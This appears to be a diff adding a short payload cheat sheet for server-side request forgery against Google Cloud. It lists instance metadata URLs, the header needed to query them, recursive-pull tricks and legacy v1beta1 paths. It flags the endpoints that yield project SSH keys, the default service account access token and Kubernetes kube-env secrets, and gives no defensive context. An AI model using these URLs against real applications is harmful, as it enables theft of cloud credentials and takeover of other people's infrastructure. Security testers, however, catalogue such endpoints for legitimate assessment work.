@@ -1,0 +1,22 @@
+Google Cloud
+
+
+requires header Metadata-Flavor: Google OR X-Google-Metadata-Request: True
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+Google allows recursive pulls
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+
+Interesting files:
+http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
+	-ssh public key
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
+	-Get access token
+http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json
+	-kubernetes
